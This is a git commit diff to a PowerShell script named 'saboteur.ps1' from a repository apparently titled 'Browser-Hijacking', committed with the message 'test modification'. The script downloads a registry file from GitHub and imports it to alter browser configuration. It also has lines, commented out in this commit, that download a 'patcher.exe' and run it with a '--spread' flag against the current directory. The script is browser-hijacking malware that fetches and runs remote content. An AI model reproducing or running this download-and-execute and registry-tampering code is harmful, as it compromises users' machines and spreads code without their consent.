eb0c4787bf58349bff3d0b346fabae1acb338463
icesonata <hoanglong1622000@gmail.com>
2021-07-21 17:02:45 +0700

    test modification

--- saboteur.ps1
+++ saboteur.ps1
@@ -2,11 +2,11 @@
 powershell -command "&{(new-object System.Net.WebClient).DownloadFile('https://github.com/icesonata/Browser-Hijacking/raw/main/ieconf.reg', '$env:tmp\\ieconf.reg')}"
 
 # Download exe file for patching the infected file
-powershell -command "&{(new-object System.Net.WebClient).DownloadFile('https://github.com/icesonata/Browser-Hijacking/raw/main/patcher.exe', '$env:tmp\\patcher.exe')}"
+#powershell -command "&{(new-object System.Net.WebClient).DownloadFile('https://github.com/icesonata/Browser-Hijacking/raw/main/patcher.exe', '$env:tmp\\patcher.exe')}"
 
 # Import reg file into registry
 powershell -command "&{reg import $env:temp\\ieconf.reg}"
 
 # Execute patching file
-powershell -command "&{. $env:temp\\patcher.exe --spread (Get-Item .).FullName}"
+#powershell -command "&{. $env:temp\\patcher.exe --spread (Get-Item .).FullName}"
 
